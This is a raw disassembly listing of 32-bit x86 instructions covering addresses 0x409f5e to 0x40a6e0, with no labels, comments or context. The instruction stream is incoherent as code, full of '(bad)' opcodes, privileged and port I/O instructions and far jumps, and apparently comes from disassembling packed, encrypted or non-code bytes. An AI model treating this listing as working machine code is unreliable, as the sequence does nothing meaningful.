  409f5e:	dec    edx
  409f5f:	rcr    BYTE PTR [ecx],cl
  409f61:	adc    eax,DWORD PTR [edx-0x663bea59]
  409f67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f68:	adc    BYTE PTR [esi],cl
  409f6a:	xchg   BYTE PTR [edi+ebx*1+0x58322b57],al
  409f71:	icebp  
  409f72:	fld    DWORD PTR [ebx]
  409f74:	out    dx,al
  409f75:	push   ebp
  409f76:	imul   ecx,DWORD PTR [esi],0xffffffe4
  409f79:	ins    BYTE PTR es:[edi],dx
  409f7a:	je     0x409f31
  409f7c:	imul   dl
  409f7e:	xor    al,0x48
  409f80:	loopne 0x409fd8
  409f82:	cmp    DWORD PTR [ebx],edx
  409f84:	mov    ?,WORD PTR [eax+edi*8-0x6e]
  409f88:	push   edx
  409f89:	outs   dx,DWORD PTR ds:[esi]
  409f8a:	outs   dx,DWORD PTR ds:[esi]
  409f8b:	sbb    DWORD PTR [eax+0x6c],edx
  409f8e:	sbb    BYTE PTR [ecx-0x648a6c16],bh
  409f94:	dec    ebx
  409f95:	jae    0x409f7f
  409f97:	mov    DWORD PTR [ebp-0x5f4a5d74],0x1ea7216e
  409fa1:	sti    
  409fa2:	jbe    0x409f3a
  409fa4:	mov    edx,DWORD PTR [ecx]
  409fa6:	loopne 0x409f8a
  409fa8:	loopne 0x409f2d
  409faa:	lods   al,BYTE PTR ds:[esi]
  409fab:	inc    ecx
  409fac:	test   DWORD PTR [ebp+0x10],0x87f3cff4
  409fb3:	pop    esi
  409fb4:	fistp  WORD PTR [ecx+0x66]
  409fb7:	cmp    DWORD PTR [edx+ecx*8-0x7182ba11],ebx
  409fbe:	xor    al,BYTE PTR [edi+0x7ee66fa5]
  409fc4:	inc    ebx
  409fc5:	push   esp
  409fc6:	push   ebp
  409fc7:	jno    0x409f8e
  409fc9:	and    dl,bl
  409fcb:	push   es
  409fcc:	std    
  409fcd:	or     edx,DWORD PTR [ebx]
  409fcf:	xchg   dh,bh
  409fd1:	bound  edi,QWORD PTR [esi+0x62]
  409fd4:	cmp    BYTE PTR ds:0xc961c935,cl
  409fda:	mov    bh,BYTE PTR [ecx]
  409fdc:	inc    eax
  409fdd:	jns    0x40a047
  409fdf:	aam    0xef
  409fe1:	sbb    BYTE PTR [ebp-0x18],cl
  409fe4:	dec    esi
  409fe5:	cmp    eax,0x260fb3cb
  409fea:	bt     DWORD PTR [edi+eiz*1+0x7e],edx
  409fef:	rcl    BYTE PTR [esi-0x5cb5b013],cl
  409ff5:	jnp    0x40a023
  409ff7:	inc    edx
  409ff8:	or     bh,dl
  409ffa:	mov    ecx,cr1
  409ffd:	icebp  
  409ffe:	sti    
  409fff:	inc    edi
  40a000:	xor    edx,DWORD PTR [ecx+0x29f061b4]
  40a006:	adc    dl,BYTE PTR [ebp+0x594a628d]
  40a00c:	das    
  40a00d:	push   ebx
  40a00e:	mov    al,0x10
  40a010:	ret    
  40a011:	push   edi
  40a012:	mov    ds:0xb734f837,al
  40a017:	cmp    ah,bl
  40a019:	and    BYTE PTR [edx-0x34cebac],dl
  40a01f:	loopne 0x40a06e
  40a021:	mov    ds,WORD PTR [ecx+0x3458b216]
  40a027:	adc    DWORD PTR [ebx-0x7d3f1077],0xffffff90
  40a02e:	fistp  DWORD PTR [edi-0x269ad948]
  40a034:	jg     0x40a02d
  40a036:	jecxz  0x40a01c
  40a038:	xor    BYTE PTR [eax+0x4f9fb4f6],bh
  40a03e:	mov    ds:0xd0e83ff,eax
  40a043:	xor    BYTE PTR [ebx+0x23],ah
  40a046:	adc    al,0x4
  40a048:	and    BYTE PTR [eax+0x17],al
  40a04b:	or     bh,ah
  40a04d:	adc    ch,ch
  40a04f:	ja     0x40a040
  40a051:	dec    eax
  40a052:	dec    edx
  40a053:	into   
  40a054:	xchg   edi,eax
  40a055:	jmp    0x9eaf4309
  40a05a:	jmp    0xee4d:0x176237fb
  40a061:	fs dec esi
  40a063:	xchg   dh,ah
  40a065:	(bad)  
  40a067:	dec    ecx
  40a068:	dec    eax
  40a069:	pop    esp
  40a06a:	xor    ah,ch
  40a06c:	aaa    
  40a06d:	cmp    DWORD PTR [edx],0x4d
  40a070:	jle    0x40a054
  40a072:	adc    BYTE PTR [eax],bl
  40a074:	fcmovne st,st(3)
  40a076:	stos   BYTE PTR es:[edi],al
  40a077:	jg     0x40a033
  40a079:	div    DWORD PTR [eax-0x3f]
  40a07c:	mov    bh,0xd1
  40a07e:	adc    ecx,esp
  40a080:	mov    ch,0xda
  40a082:	into   
  40a083:	bound  ecx,QWORD PTR [esi]
  40a085:	push   ebx
  40a086:	les    ecx,FWORD PTR [esi+esi*8-0xf]
  40a08a:	mov    ch,0x4b
  40a08c:	stos   BYTE PTR es:[edi],al
  40a08d:	add    esp,DWORD PTR [ebp+0xa2d3b12]
  40a093:	xor    ah,BYTE PTR [ebp+0x4e32c8cb]
  40a099:	daa    
  40a09a:	sbb    eax,0x8dc2a86
  40a09f:	call   0x2a6e2398
  40a0a4:	add    BYTE PTR [ebx],dh
  40a0a6:	(bad)  
  40a0a7:	std    
  40a0a8:	add    esi,eax
  40a0aa:	out    0x34,eax
  40a0ac:	xor    BYTE PTR [ebx+0x355e2fa0],ah
  40a0b2:	fild   QWORD PTR [edi]
  40a0b4:	stos   DWORD PTR es:[edi],eax
  40a0b5:	push   cs
  40a0b6:	leave  
  40a0b7:	mov    ch,0x77
  40a0b9:	into   
  40a0ba:	push   ebx
  40a0bb:	mov    dh,0x6f
  40a0bd:	mov    ds:0x961da50d,al
  40a0c2:	pop    edi
  40a0c3:	icebp  
  40a0c4:	lods   al,BYTE PTR ds:[esi]
  40a0c5:	xor    bh,BYTE PTR [ebp+0x5ebbc6b]
  40a0cb:	pop    ss
  40a0cc:	xchg   ecx,eax
  40a0cd:	pop    ecx
  40a0ce:	out    dx,al
  40a0cf:	inc    edi
  40a0d0:	daa    
  40a0d1:	retf   0xa8ba
  40a0d4:	bound  esp,QWORD PTR [eax]
  40a0d6:	sbb    BYTE PTR [esi+0x1437bb48],cl
  40a0dc:	cld    
  40a0dd:	shr    DWORD PTR [ebx-0x315b09ac],0xfd
  40a0e4:	mov    bl,0x8e
  40a0e6:	es std 
  40a0e8:	or     bl,bh
  40a0ea:	rol    BYTE PTR [ecx+0x61],0x9c
  40a0ee:	cs ret 
  40a0f0:	xchg   esi,eax
  40a0f1:	jo     0x40a0ee
  40a0f3:	gs xchg esi,eax
  40a0f5:	xchg   edi,eax
  40a0f6:	jmp    0xae11:0xa3b7e6a7
  40a0fd:	scas   eax,DWORD PTR es:[edi]
  40a0fe:	loope  0x40a0c1
  40a100:	ds test al,0x77
  40a103:	and    ebx,DWORD PTR [ebp+0x4e]
  40a106:	sub    al,0x2c
  40a108:	dec    edi
  40a109:	and    DWORD PTR [esi+0x72f82f54],ecx
  40a10f:	in     eax,0x37
  40a111:	mov    edi,DWORD PTR [eax-0x20d67a24]
  40a117:	xchg   esp,eax
  40a118:	es iret 
  40a11a:	cdq    
  40a11b:	jle    0x40a164
  40a11d:	jnp    0x40a0a7
  40a11f:	int3   
  40a120:	jns    0x40a0a8
  40a122:	fs ja  0x40a1a2
  40a125:	xor    BYTE PTR [ebp-0x5b],dl
  40a128:	or     DWORD PTR [ebx-0x40c665b3],edi
  40a12e:	aam    0x32
  40a130:	and    ecx,ebx
  40a132:	push   eax
  40a133:	mov    eax,0x6c30eebc
  40a138:	ret    0x2d0a
  40a13b:	cld    
  40a13c:	fwait
  40a13d:	outs   dx,BYTE PTR ds:[esi]
  40a13e:	ss mov bh,0x2d
  40a141:	xorps  xmm1,XMMWORD PTR [eax+0xff39b55]
  40a148:	push   edx
  40a149:	jmp    0xb716:0x4fb81521
  40a150:	push   es
  40a151:	xor    eax,0xfe83cf19
  40a156:	mov    ebx,0x9334a267
  40a15b:	test   DWORD PTR [eax-0xa],edx
  40a15e:	and    al,0x1f
  40a160:	jnp    0x40a1a2
  40a162:	imul   esp,ecx,0x2be07e80
  40a168:	and    dl,BYTE PTR [eax-0x7ec8ff39]
  40a16e:	loopne 0x40a125
  40a170:	cdq    
  40a171:	retf   0x1bf5
  40a174:	int    0xa7
  40a176:	je     0x40a117
  40a178:	or     al,0x37
  40a17a:	mov    ah,0xa3
  40a17c:	inc    edx
  40a17d:	sub    DWORD PTR [ebp+0x6cf4cb10],esp
  40a183:	(bad)  
  40a184:	fld    QWORD PTR [edx]
  40a186:	mov    ds:0xc0cd4391,al
  40a18b:	or     BYTE PTR [ecx],al
  40a18d:	cwde   
  40a18e:	dec    edi
  40a18f:	mov    eax,ds:0xb98cca04
  40a194:	jnp    0x40a177
  40a196:	cmp    BYTE PTR [eax-0x54fbc8f9],ch
  40a19c:	xor    BYTE PTR [eax+ecx*4-0x51],bl
  40a1a0:	rcl    ebp,0x41
  40a1a3:	stos   BYTE PTR es:[edi],al
  40a1a4:	or     eax,0x4dcb9362
  40a1a9:	push   edx
  40a1aa:	or     al,0x4f
  40a1ac:	mov    ebx,0x2be1b490
  40a1b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1b2:	call   0x7ffe:0x1109af7f
  40a1b9:	ds mov dl,0xd3
  40a1bc:	les    edi,FWORD PTR [eax+0x156fc837]
  40a1c2:	mov    dl,BYTE PTR [ebx-0x25f98eaa]
  40a1c8:	dec    ebx
  40a1c9:	and    BYTE PTR [edi+0x67a613b2],ch
  40a1cf:	mov    eax,0xa5a03344
  40a1d4:	int3   
  40a1d5:	arpl   WORD PTR [ecx+0x51],di
  40a1d8:	xchg   DWORD PTR [edi],ebp
  40a1da:	and    al,BYTE PTR [edi]
  40a1dc:	lods   al,BYTE PTR ds:[esi]
  40a1dd:	mov    al,0xe3
  40a1df:	jb     0x40a1e9
  40a1e1:	push   ss
  40a1e2:	jns    0x40a201
  40a1e4:	fstp   QWORD PTR [edi-0x42129994]
  40a1ea:	mov    ebx,0x94951d53
  40a1ef:	js     0x40a183
  40a1f1:	xchg   BYTE PTR [edi+0x70],ah
  40a1f4:	in     eax,dx
  40a1f5:	retf   
  40a1f6:	retf   
  40a1f7:	sub    ebx,edi
  40a1f9:	in     eax,dx
  40a1fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1fb:	fstp   QWORD PTR [ecx+0x60]
  40a1fe:	adc    dl,BYTE PTR [ecx+edx*2]
  40a201:	rcr    DWORD PTR [eax+0x651f7f42],1
  40a207:	lds    ebp,FWORD PTR [esi]
  40a209:	int3   
  40a20a:	jl     0x40a194
  40a20c:	pushf  
  40a20d:	in     al,0xc3
  40a20f:	mov    al,0xeb
  40a211:	rcl    esp,1
  40a213:	arpl   WORD PTR [edx],si
  40a215:	push   edi
  40a216:	pop    ebp
  40a217:	std    
  40a218:	cmp    eax,0xeff15833
  40a21d:	add    eax,DWORD PTR [edx-0x4a]
  40a220:	into   
  40a221:	jle    0x40a1b6
  40a223:	xor    BYTE PTR ds:0x4da6bb02,dl
  40a229:	sbb    eax,0xa81a6b4f
  40a22e:	fs add eax,0xb00a838
  40a234:	retf   0x95a4
  40a237:	xchg   esi,eax
  40a238:	jnp    0x40a209
  40a23a:	es stc 
  40a23c:	fidiv  WORD PTR [esi-0x62]
  40a23f:	scas   al,BYTE PTR es:[edi]
  40a240:	xlat   BYTE PTR ds:[ebx]
  40a241:	test   DWORD PTR [ebx-0x70639778],edi
  40a247:	sub    al,0x5d
  40a249:	mov    al,ds:0x508f1f17
  40a24e:	jge    0x40a21b
  40a250:	or     al,0x7d
  40a252:	inc    ebp
  40a253:	cmp    BYTE PTR [edi+0x158a04e6],bh
  40a259:	addr16 ret 
  40a25b:	adc    al,0xfb
  40a25d:	mov    esi,0xd090a69
  40a262:	mov    ecx,ds
  40a264:	jle    0x40a28f
  40a266:	loop   0x40a21e
  40a268:	stos   BYTE PTR es:[edi],al
  40a269:	outs   dx,DWORD PTR ds:[esi]
  40a26a:	stc    
  40a26b:	mov    dh,BYTE PTR [eax-0x580c04]
  40a271:	stos   BYTE PTR es:[edi],al
  40a272:	mov    WORD PTR [esi],?
  40a274:	enter  0x8767,0x7e
  40a278:	scas   eax,DWORD PTR es:[edi]
  40a279:	mov    bh,0x91
  40a27b:	inc    edx
  40a27c:	sbb    al,0x10
  40a27e:	and    eax,0xcad9528a
  40a283:	xchg   esi,eax
  40a284:	loope  0x40a238
  40a286:	inc    ebx
  40a287:	iret   
  40a288:	mov    gs,WORD PTR [esi]
  40a28a:	(bad)  
  40a28b:	sti    
  40a28c:	or     eax,DWORD PTR [edi+0x45992ac5]
  40a292:	sbb    edi,DWORD PTR [ecx+0x1caf95db]
  40a298:	xor    al,0x9c
  40a29a:	xlat   BYTE PTR ds:[ebx]
  40a29b:	mov    al,ds:0x7b23a9ee
  40a2a0:	iret   
  40a2a1:	mov    esp,0x82bd01ce
  40a2a6:	push   ss
  40a2a7:	jo     0x40a2f9
  40a2a9:	or     DWORD PTR [eax-0xb],esp
  40a2ac:	pop    ebx
  40a2ad:	adc    eax,0x41c89df8
  40a2b2:	xchg   edx,eax
  40a2b3:	sbb    al,0x30
  40a2b5:	ins    BYTE PTR es:[edi],dx
  40a2b6:	(bad)  
  40a2b7:	shr    DWORD PTR [ebx+0x565508be],cl
  40a2bd:	les    edx,FWORD PTR [ebp+0x52]
  40a2c0:	xor    ecx,DWORD PTR [edx]
  40a2c2:	fild   QWORD PTR [eax+esi*4-0x68]
  40a2c6:	mov    ebx,DWORD PTR [eax+edx*1]
  40a2c9:	hlt    
  40a2ca:	push   esi
  40a2cb:	test   al,0xe0
  40a2cd:	out    0x84,eax
  40a2cf:	adc    ch,BYTE PTR [edi-0x1838b45f]
  40a2d5:	imul   edi,DWORD PTR [esi],0x50
  40a2d8:	inc    eax
  40a2d9:	hlt    
  40a2da:	xor    al,BYTE PTR [esi+0x103b1d78]
  40a2e0:	dec    edi
  40a2e1:	(bad)  
  40a2e2:	adc    al,BYTE PTR [esi+ebx*4+0x704e3cfc]
  40a2e9:	(bad)  
  40a2ea:	hlt    
  40a2eb:	fs adc eax,0x3457bc60
  40a2f1:	mov    al,0x42
  40a2f3:	fcom   DWORD PTR [ecx-0x496426a3]
  40a2f9:	ja     0x40a2ee
  40a2fb:	mov    eax,0xd2ddbe57
  40a300:	ins    BYTE PTR es:[edi],dx
  40a301:	lea    edx,[ecx+0x68]
  40a304:	xchg   ebx,eax
  40a305:	push   edx
  40a306:	(bad)  
  40a307:	cmc    
  40a308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a309:	pop    edi
  40a30b:	dec    edi
  40a30c:	push   ss
  40a30d:	mov    ds:0xc51b199e,al
  40a312:	xchg   edx,eax
  40a313:	xchg   BYTE PTR [ebp-0x6729344a],dh
  40a319:	clc    
  40a31a:	sub    dh,BYTE PTR [edi+0x61879f3c]
  40a320:	jno    0x40a2d5
  40a322:	popa   
  40a323:	(bad)  
  40a324:	or     al,0x7c
  40a326:	cmp    al,BYTE PTR [eax]
  40a328:	mov    ah,BYTE PTR [ebx]
  40a32a:	mov    esi,0x5cab8c05
  40a32f:	out    0xd5,eax
  40a331:	mov    ch,0x6e
  40a333:	(bad)  
  40a334:	leave  
  40a335:	cmc    
  40a336:	ret    
  40a337:	cmp    ebx,0xffffffb6
  40a33a:	mov    al,ds:0xb229c19e
  40a33f:	lar    ebx,WORD PTR [ebx-0x233eb55f]
  40a346:	(bad)  
  40a347:	pop    esp
  40a348:	sub    esp,DWORD PTR [ecx+0x6e]
  40a34b:	adc    BYTE PTR [ebx],0x67
  40a34e:	sar    BYTE PTR [edi-0x38ea6369],1
  40a354:	push   ebx
  40a355:	ins    BYTE PTR es:[edi],dx
  40a356:	int3   
  40a357:	mov    eax,0xf22f2bd2
  40a35c:	and    al,0x41
  40a35e:	enter  0x558a,0x8c
  40a362:	and    DWORD PTR [ecx-0x33],0x59
  40a366:	cmp    edi,ebp
  40a368:	xor    BYTE PTR [ebx],dh
  40a36a:	mov    ebp,0x5508219e
  40a36f:	sub    eax,0xe63c6793
  40a374:	mov    al,ds:0x237b4fc7
  40a379:	sahf   
  40a37a:	(bad)  
  40a37b:	lods   al,BYTE PTR ds:[esi]
  40a37c:	inc    esp
  40a37d:	fdiv   st,st(4)
  40a37f:	test   DWORD PTR [eax-0x1e],esp
  40a382:	xchg   ebp,eax
  40a383:	xchg   esp,ebx
  40a385:	jo     0x40a37b
  40a387:	add    al,0xa6
  40a389:	rol    DWORD PTR [eax],cl
  40a38b:	test   BYTE PTR [eax-0x6cff3480],al
  40a391:	cld    
  40a392:	inc    ebx
  40a393:	idiv   BYTE PTR [ebp-0x1912c5c2]
  40a399:	jmp    0x40a377
  40a39b:	ss xchg esp,eax
  40a39d:	shl    cl,0xb8
  40a3a0:	imul   ebp,DWORD PTR [ebx+eiz*8+0x4f],0xcd0e9715
  40a3a8:	mov    edi,0x4c090e00
  40a3ad:	pusha  
  40a3ae:	sahf   
  40a3af:	jmp    0x40a395
  40a3b1:	inc    eax
  40a3b2:	pop    ss
  40a3b3:	pop    edx
  40a3b4:	mov    ch,0x6
  40a3b6:	test   al,0x1f
  40a3b8:	mov    eax,0xc5fb1cad
  40a3bd:	cmp    edi,ebx
  40a3bf:	sub    eax,0x3e23b550
  40a3c4:	dec    esp
  40a3c5:	adc    eax,0xe46c73b9
  40a3ca:	dec    esp
  40a3cb:	xor    al,0xba
  40a3cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3ce:	fnsave [edi]
  40a3d0:	scas   eax,DWORD PTR es:[edi]
  40a3d1:	in     al,0x50
  40a3d3:	cmp    esp,esp
  40a3d5:	push   es
  40a3d6:	mov    ebx,0x6099ce9b
  40a3db:	arpl   bp,bp
  40a3dd:	into   
  40a3de:	pusha  
  40a3df:	dec    ecx
  40a3e0:	test   al,0x5a
  40a3e2:	std    
  40a3e3:	jmp    FWORD PTR [edx+0x31cb6abf]
  40a3e9:	daa    
  40a3ea:	sbb    ch,BYTE PTR [ecx+0x1]
  40a3ed:	cmp    al,0xeb
  40a3ef:	xor    eax,0xd8a6cfc5
  40a3f4:	daa    
  40a3f5:	call   0x1b0f3673
  40a3fa:	dec    edi
  40a3fb:	into   
  40a3fc:	xor    BYTE PTR [esi+0x4c1d55d2],0x49
  40a403:	jns    0x40a399
  40a405:	in     eax,0x3f
  40a407:	std    
  40a408:	and    eax,DWORD PTR [ebp-0x45504c7a]
  40a40e:	and    DWORD PTR [eax-0x60da67b9],edx
  40a414:	popa   
  40a415:	cwde   
  40a416:	gs xchg esp,eax
  40a418:	push   ecx
  40a419:	cld    
  40a41a:	mov    ds:0xcc53d68e,eax
  40a41f:	std    
  40a420:	cmp    DWORD PTR es:[edi],esp
  40a423:	pop    edi
  40a424:	and    bl,BYTE PTR [ebp-0x6a]
  40a427:	push   ebp
  40a428:	scas   eax,DWORD PTR es:[edi]
  40a429:	fdivr  st(1),st
  40a42b:	inc    ebp
  40a42c:	ror    DWORD PTR [eax-0x50d1f1ba],cl
  40a432:	push   ebx
  40a433:	or     BYTE PTR ss:[edx],bl
  40a436:	test   al,ch
  40a438:	jnp    0x40a3ca
  40a43a:	rcr    BYTE PTR [eax-0x1d],0xa5
  40a43e:	xchg   esp,eax
  40a43f:	lea    ecx,[esp+eax*2-0x172e4d2b]
  40a446:	stos   DWORD PTR es:[edi],eax
  40a447:	in     eax,0xe
  40a449:	lds    esp,FWORD PTR [ebx+0x73]
  40a44c:	xchg   ecx,eax
  40a44d:	push   0xffffff84
  40a44f:	jno    0x40a44c
  40a451:	les    esp,FWORD PTR [eax-0x17]
  40a454:	sub    ecx,DWORD PTR [ebx-0x80]
  40a457:	out    0x11,eax
  40a459:	jmp    0x675dc2c6
  40a45e:	fcomp  DWORD PTR [ebx+0x1d]
  40a461:	nop
  40a462:	mov    ah,0xb
  40a464:	inc    BYTE PTR [ebp-0x6c]
  40a467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a468:	xchg   esi,eax
  40a469:	std    
  40a46a:	fisub  WORD PTR [edx+0x2d]
  40a46d:	sar    BYTE PTR [ecx],1
  40a46f:	xchg   edi,eax
  40a470:	jmp    DWORD PTR [edx+0x21]
  40a473:	and    ebx,DWORD PTR [eax]
  40a475:	sbb    DWORD PTR ds:0x972297ab,edx
  40a47b:	sub    DWORD PTR [edi+ecx*1-0x47],ebp
  40a47f:	loopne 0x40a4d9
  40a481:	mov    DWORD PTR [esi+eax*4+0x3a],esi
  40a485:	in     eax,dx
  40a486:	ins    DWORD PTR es:[edi],dx
  40a487:	cmp    eax,0x5eec149e
  40a48c:	in     al,0x5d
  40a48e:	push   ds
  40a48f:	push   0x1a
  40a491:	clc    
  40a492:	in     al,dx
  40a493:	pop    fs
  40a495:	mov    DWORD PTR [edi+0x5dc6ae8f],edx
  40a49b:	push   eax
  40a49c:	ins    DWORD PTR es:[edi],dx
  40a49d:	out    0xb8,al
  40a49f:	xor    al,0x79
  40a4a1:	mov    cl,0x9f
  40a4a3:	cli    
  40a4a4:	(bad)  
  40a4a5:	cwde   
  40a4a6:	push   esi
  40a4a7:	sbb    BYTE PTR [ecx],cl
  40a4a9:	push   ecx
  40a4aa:	(bad)  
  40a4ab:	loopne 0x40a4ba
  40a4ad:	fwait
  40a4ae:	in     eax,dx
  40a4af:	(bad)  
  40a4b0:	cmp    al,0x6b
  40a4b2:	inc    ebx
  40a4b3:	lds    ebp,FWORD PTR [eax-0x44]
  40a4b6:	and    DWORD PTR [ebp-0x42e8b25a],esp
  40a4bc:	rcr    BYTE PTR [edx+0x10a50930],1
  40a4c2:	pushf  
  40a4c3:	lock or eax,0xb9f91234
  40a4c9:	and    ch,BYTE PTR [ebx]
  40a4cb:	out    dx,al
  40a4cc:	mov    eax,ds:0xecbd6cd6
  40a4d1:	lods   eax,DWORD PTR ds:[esi]
  40a4d2:	das    
  40a4d3:	or     bh,BYTE PTR [edx+0x59]
  40a4d6:	and    bl,ah
  40a4d8:	push   esp
  40a4d9:	or     DWORD PTR [ecx-0x40290bc],ecx
  40a4df:	int3   
  40a4e0:	sub    al,0xc2
  40a4e2:	dec    DWORD PTR [edx+0x16]
  40a4e5:	xor    BYTE PTR [ebp+0x30583845],dl
  40a4eb:	dec    esi
  40a4ec:	fnstenv [ecx-0x7d]
  40a4ef:	or     al,0x22
  40a4f1:	inc    eax
  40a4f2:	push   cs
  40a4f3:	pop    ebx
  40a4f4:	jne    0x40a56a
  40a4f6:	dec    eax
  40a4f7:	or     bh,BYTE PTR ds:0x9fd2dac7
  40a4fd:	mov    ebx,0x12103735
  40a502:	jnp    0x40a4f6
  40a504:	rcr    ecx,cl
  40a506:	fdivr  st(7),st
  40a508:	mov    dl,0x10
  40a50a:	lods   al,BYTE PTR ds:[esi]
  40a50b:	icebp  
  40a50c:	mov    ?,WORD PTR [ebp-0x2a]
  40a50f:	cmp    edi,DWORD PTR [edi+ebp*1]
  40a512:	cmp    DWORD PTR [ebx],ebx
  40a514:	outs   dx,DWORD PTR ds:[esi]
  40a515:	or     BYTE PTR [edx],ah
  40a517:	dec    BYTE PTR ds:0x831b9463
  40a51d:	cli    
  40a51e:	or     al,0x70
  40a520:	out    0xa4,al
  40a522:	pop    ds
  40a523:	push   edx
  40a524:	call   0xffde7e8c
  40a529:	loope  0x40a537
  40a52b:	iret   
  40a52c:	sti    
  40a52d:	inc    esp
  40a52e:	(bad)  
  40a52f:	dec    eax
  40a530:	or     eax,0x7e2d4817
  40a535:	xlat   BYTE PTR ds:[ebx]
  40a536:	xor    DWORD PTR [ecx+0x1],0xffffff87
  40a53a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a53b:	jae    0x40a4dd
  40a53d:	or     BYTE PTR [ebx+esi*8+0x3bb6027a],al
  40a544:	lea    ecx,[edx-0x18]
  40a547:	mov    cl,0xc3
  40a549:	push   edx
  40a54a:	pushf  
  40a54b:	jns    0x40a5b7
  40a54d:	loope  0x40a587
  40a54f:	shr    BYTE PTR [ebx],1
  40a551:	xchg   DWORD PTR [ecx],ebp
  40a553:	scas   eax,DWORD PTR es:[edi]
  40a554:	daa    
  40a555:	jnp    0x40a5c6
  40a557:	fucom  st(2)
  40a559:	dec    ebp
  40a55a:	pusha  
  40a55b:	mov    eax,0xbc60ff5d
  40a560:	lds    ebx,FWORD PTR [edi-0x48eeafb4]
  40a566:	outs   dx,BYTE PTR ds:[esi]
  40a567:	jle    0x40a5cd
  40a569:	or     DWORD PTR [ebx+0x15],0x51
  40a56d:	xchg   ebp,eax
  40a56e:	mov    bh,0x8b
  40a570:	inc    edi
  40a571:	aas    
  40a572:	dec    edx
  40a573:	cmp    ecx,DWORD PTR [ebx-0x4c93a06]
  40a579:	aam    0xc
  40a57b:	and    al,0xb6
  40a57d:	dec    ebp
  40a57e:	xor    bl,dh
  40a580:	out    0x7d,al
  40a582:	sahf   
  40a583:	push   0xffffffac
  40a585:	sahf   
  40a586:	cmp    DWORD PTR ds:0xea992772,0x587e8a05
  40a590:	into   
  40a591:	into   
  40a592:	jo     0x40a55f
  40a594:	jmp    0x370571fe
  40a599:	cmp    ch,BYTE PTR [ecx+0x66cad77e]
  40a59f:	xor    al,0x9b
  40a5a1:	out    dx,eax
  40a5a2:	rcr    BYTE PTR [edi+ecx*2],1
  40a5a5:	test   eax,0x1f97e6e7
  40a5aa:	test   eax,0xe1c50a2a
  40a5af:	int    0x7a
  40a5b1:	sbb    DWORD PTR [esi-0x163e7fed],ebp
  40a5b7:	xor    eax,0xee5eb000
  40a5bc:	mov    ds:0x3748f218,al
  40a5c1:	pop    ecx
  40a5c2:	shr    BYTE PTR [edi-0x251d926f],0xa3
  40a5c9:	rcl    BYTE PTR [ecx+eax*2-0x2],cl
  40a5cd:	xor    dl,dl
  40a5cf:	add    al,0x19
  40a5d1:	repz mov esi,0x735bce71
  40a5d7:	xchg   ebp,eax
  40a5d8:	mov    ds:0x505533c5,eax
  40a5dd:	jae    0x40a5ca
  40a5df:	push   ebp
  40a5e0:	sub    BYTE PTR [edx+0x78],cl
  40a5e3:	out    dx,al
  40a5e4:	and    eax,0xd494eec
  40a5e9:	jecxz  0x40a58e
  40a5eb:	pop    es
  40a5ec:	or     al,0xd
  40a5ee:	test   BYTE PTR [ebx+0x16],cl
  40a5f1:	shl    DWORD PTR [eax+ecx*1-0x4b],cl
  40a5f5:	inc    esi
  40a5f6:	test   eax,0x6b760c43
  40a5fb:	ret    
  40a5fc:	cmp    al,0x47
  40a5fe:	inc    esi
  40a5ff:	test   BYTE PTR [eax+eax*2-0x43],0xde
  40a604:	ror    BYTE PTR [edx+0x649e02bf],cl
  40a60a:	mov    ss,ecx
  40a60c:	mov    gs,WORD PTR [esi-0x32]
  40a60f:	jle    0x40a5b5
  40a611:	cmp    DWORD PTR [esi+0xeaf5b08],ebx
  40a617:	mov    al,ds:0x180a004f
  40a61c:	pop    edi
  40a61d:	dec    ecx
  40a61e:	not    ebx
  40a620:	(bad)  
  40a621:	sti    
  40a622:	mov    ebx,0xda62c1df
  40a627:	sub    BYTE PTR [ebp+0x5de5fcbb],ah
  40a62d:	in     eax,dx
  40a62e:	and    DWORD PTR [edi-0x36],esp
  40a631:	or     eax,0xfb9f6d7d
  40a636:	cs sti 
  40a638:	jmp    0x21c6:0xcd30d730
  40a63f:	or     ch,bl
  40a641:	sbb    al,0x45
  40a643:	mov    dh,0x22
  40a645:	test   BYTE PTR [edx+0x1cfe77bd],bh
  40a64b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a64c:	xchg   BYTE PTR [ebp+0x36e62b28],ch
  40a652:	push   eax
  40a653:	shl    DWORD PTR [esi],cl
  40a655:	dec    eax
  40a656:	rcl    BYTE PTR [edx+ecx*8-0x49374ae8],1
  40a65d:	mov    ch,0x7c
  40a65f:	iret   
  40a660:	mov    ds:0xdfee3c8f,al
  40a665:	pushf  
  40a666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a667:	mov    ebp,0x80cce5cc
  40a66c:	fisttp QWORD PTR [edi]
  40a66e:	mov    bh,0x1e
  40a670:	call   0x4bd9:0x1d46b1b0
  40a677:	push   eax
  40a678:	test   dh,dl
  40a67a:	jne    0x40a68a
  40a67c:	push   0xfec96540
  40a681:	sbb    ebx,DWORD PTR [edx-0x7b]
  40a684:	bound  eax,QWORD PTR [ebp-0x10]
  40a687:	sahf   
  40a688:	cmp    BYTE PTR [ecx+0x2fa7a2bf],dl
  40a68e:	inc    eax
  40a68f:	ficom  DWORD PTR [ebx+0x1ace78df]
  40a695:	cmp    DWORD PTR [ebx],ebx
  40a697:	dec    edi
  40a698:	jno    0x40a623
  40a69a:	dec    esi
  40a69b:	push   cs
  40a69c:	cdq    
  40a69d:	sub    eax,0xe9cf463e
  40a6a2:	add    eax,0x3be1b7a2
  40a6a7:	cs sub al,0xc6
  40a6aa:	add    dl,0x80
  40a6ad:	or     ah,dh
  40a6af:	adc    eax,0xb5dbb638
  40a6b4:	dec    edx
  40a6b5:	cmp    esi,ebx
  40a6b7:	ja     0x40a685
  40a6b9:	xchg   esi,eax
  40a6ba:	sub    DWORD PTR [ebx+0x2b],eax
  40a6bd:	ret    0x8813
  40a6c0:	cmc    
  40a6c1:	push   ss
  40a6c2:	mov    ch,0x7
  40a6c4:	sub    BYTE PTR [ebx],dl
  40a6c6:	mov    al,ds:0x77d089a3
  40a6cb:	jmp    0x9bdc1ee6
  40a6d0:	lock jo 0x40a6eb
  40a6d3:	jnp    0x40a702
  40a6d5:	xchg   esp,eax
  40a6d6:	sahf   
  40a6d7:	pushf  
  40a6d8:	fst    QWORD PTR cs:[ecx-0x4fb90f79]
  40a6df:	inc    ebp
  40a6e0:	add    al,0x1b
